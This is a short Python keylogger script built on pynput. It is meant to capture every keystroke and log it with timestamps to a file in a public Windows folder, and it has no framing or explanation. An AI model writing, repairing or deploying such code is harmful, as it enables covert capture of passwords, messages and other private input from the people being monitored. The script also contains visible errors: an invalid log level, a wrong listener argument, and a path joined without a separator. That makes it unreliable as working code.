from pynput.keyboard import Key, Listener
import sys
import logging

log_dir = r"C:/users/public/roaming"

try:
    logging.basicConfig (
                        filename=(log_dir+"log.txt"), level=logging.debug,
                        format='%(asctime)s: %(message)s'
                        )
except FileNotFoundError:
    print("File Path DNE. Terminating ...")
    sys.exit(0)

def keyPress(key):
    logging.info(str(key))

with Listener(keyPress=keyPress) as listener:
    listener.join()
